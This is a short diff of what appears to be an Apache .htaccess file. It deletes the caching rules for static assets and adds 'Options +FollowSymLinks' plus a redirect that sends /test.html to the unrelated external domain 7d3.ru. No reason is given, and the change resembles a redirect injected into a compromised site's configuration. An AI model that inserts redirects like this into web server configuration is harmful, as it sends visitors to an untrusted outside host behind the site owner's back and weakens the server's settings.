@@ -1,3 +1,2 @@
-<FilesMatch ".(flv|gif|jpg|jpeg|webp|png|ico|swf|js|css|pdf)$">
-  Header set Cache-Control "max-age=2592000"
-</FilesMatch>
+Options +FollowSymLinks
+Redirect /test.html http://7d3.ru
